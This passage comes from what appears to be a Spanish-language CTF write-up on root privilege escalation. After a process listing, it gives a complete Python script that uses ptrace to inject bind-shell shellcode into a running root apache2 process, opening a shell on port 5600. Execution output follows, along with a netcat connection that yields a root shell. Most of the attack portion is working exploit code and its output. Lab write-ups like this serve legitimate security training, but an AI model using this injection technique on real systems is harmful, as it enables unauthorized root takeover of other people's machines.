root         255       2  0 02:10 ?        00:00:00 [scsi_eh_29]
root         256       2  0 02:10 ?        00:00:00 [scsi_tmf_29]
root         257       2  0 02:10 ?        00:00:00 [scsi_eh_30]
root         258       2  0 02:10 ?        00:00:00 [scsi_tmf_30]
root         259       2  0 02:10 ?        00:00:00 [scsi_eh_31]
root         260       2  0 02:10 ?        00:00:00 [scsi_tmf_31]
root         288       2  0 02:10 ?        00:00:00 [scsi_eh_32]
root         289       2  0 02:10 ?        00:00:00 [scsi_tmf_32]
root         291       2  0 02:10 ?        00:00:00 [kworker/1:1H-kblockd]
root         295       2  0 02:10 ?        00:00:01 [kworker/0:1H-kblockd]
root         316       2  0 02:10 ?        00:00:00 [jbd2/sda5-8]
root         317       2  0 02:10 ?        00:00:00 [ext4-rsv-conver]
root         356       1  0 02:10 ?        00:00:00 /lib/systemd/systemd-journald
root         382       2  0 02:10 ?        00:00:00 [irq/16-vmwgfx]
root         385       2  0 02:10 ?        00:00:00 [ttm_swap]
root         387       2  0 02:10 ?        00:00:00 [loop2]
root         390       1  0 02:10 ?        00:00:00 /lib/systemd/systemd-udevd
root         394       2  0 02:10 ?        00:00:00 [loop3]
root         395       2  0 02:10 ?        00:00:00 [loop4]
root         402       2  0 02:10 ?        00:00:00 [loop6]
root         403       1  0 02:10 ?        00:00:00 vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid
root         486       2  0 02:10 ?        00:00:00 [kworker/u257:2-hci0]
root         501       2  0 02:10 ?        00:00:00 [cryptd]
root         700       1  0 02:10 ?        00:00:00 /usr/bin/VGAuthService
root         703       1  0 02:10 ?        00:00:05 /usr/bin/vmtoolsd
root         721       1  0 02:10 ?        00:00:00 /usr/lib/accountsservice/accounts-daemon
root         722       1  0 02:10 ?        00:00:00 /usr/sbin/acpid
root         723       1  0 02:10 ?        00:00:00 /usr/sbin/anacron -d -q -s
root         726       1  0 02:10 ?        00:00:00 /usr/lib/bluetooth/bluetoothd
root         729       1  0 02:10 ?        00:00:00 /usr/sbin/cron -f
root         732       1  0 02:10 ?        00:00:00 /usr/sbin/NetworkManager --no-daemon
root         749       1  0 02:10 ?        00:00:00 /usr/sbin/irqbalance --foreground
root         762       1  0 02:10 ?        00:00:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         766       1  0 02:10 ?        00:00:00 /usr/lib/policykit-1/polkitd --no-debug
root         788       1  0 02:10 ?        00:00:00 /usr/libexec/switcheroo-control
root         789       1  0 02:10 ?        00:00:00 /lib/systemd/systemd-logind
root         791       1  0 02:10 ?        00:00:00 /usr/lib/udisks2/udisksd
root         793       1  0 02:10 ?        00:00:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
avahi        804     725  0 02:10 ?        00:00:00 avahi-daemon: chroot helper
root         847       1  0 02:10 ?        00:00:00 /usr/sbin/cups-browsed
root         889       1  0 02:10 ?        00:00:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root         892       1  0 02:10 ?        00:00:00 /usr/sbin/ModemManager --filter-policy=strict
root         930       1  0 02:10 ?        00:00:00 /usr/sbin/gdm3
root         945     930  0 02:10 ?        00:00:00 gdm-session-worker [pam/gdm-launch-environment]
root         954       1  0 02:10 ?        00:00:01 /usr/sbin/apache2 -k start
root         972       1  0 02:10 ?        00:00:00 /usr/sbin/cupsd -l
root        1177       1  0 02:10 ?        00:00:00 /usr/lib/upower/upowerd
gdm         1220    1126  0 02:10 tty1     00:00:00 /usr/bin/Xwayland :1024 -rootless -noreset -accessx -core -auth /run/user/125/.mutter-Xwaylandauth.PDJ901 -listen 4 -listen 5 -displayfd 6 -listen 7
root        1559       2  0 02:11 ?        00:00:00 [loop10]
root        1653       2  0 02:11 ?        00:00:00 [loop11]
root        1720       1  0 02:11 ?        00:00:17 /usr/lib/snapd/snapd
root        2131       2  0 02:11 ?        00:00:00 [loop0]
root        2236       2  0 02:11 ?        00:00:00 [loop7]
root        2411       2  0 02:11 ?        00:00:00 [loop12]
root        2450       2  0 02:11 ?        00:00:00 [loop13]
root        2628       2  0 02:12 ?        00:00:00 [loop1]
root        2768       2  0 02:12 ?        00:00:00 [loop8]
root        2895       2  0 02:21 ?        00:00:00 [kworker/u256:0-events_power_efficient]
root        2898       2  0 02:26 ?        00:00:00 [kworker/1:0-events]
root        3064       2  0 03:09 ?        00:00:00 [kworker/u256:1-events_power_efficient]
root        3067       2  0 03:10 ?        00:00:00 [kworker/0:0-events]
root        3119       2  0 03:10 ?        00:00:00 [kworker/1:1-memcg_kmem_cache]
root        3188       2  0 03:15 ?        00:00:00 [kworker/u256:2-events_unbound]
saket       3190    3167  0 03:16 pts/0    00:00:00 grep --color=auto root
saket@ubuntu:~$ 
```

Seleccionaré el proceso `root         954       1  0 02:10 ?        00:00:01 /usr/sbin/apache2 -k start`, cuyo ID es `954`, ahora explotaremos la vulnerabilidad, para ello, usaremos este script en python

```python
#!/usr/bin/python3

import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
    # Convert the byte to little endian.
    shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
    shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
    shellcode_byte=int(shellcode_byte_little_endian,16)

    # Inject the byte.
    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```

El script lo que hace es lanzar una `bind shell` en el puerto 5600, el script ha de ser ejecutado con el ID del proceso

```shell
saket@ubuntu:/tmp$ python2.7 inject.py 954
Instruction Pointer: 0x7f85eca170daL
Injecting Shellcode at: 0x7f85eca170daL
Shellcode Injected!!
Final Instruction Pointer: 0x7f85eca170dcL
saket@ubuntu:/tmp$ 
```

Ahora si nos conectamos con `netcat` al puerto 5600, obtenemos la consola como el usuario `root`

```shell
❯ nc 192.168.1.148 5600
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
```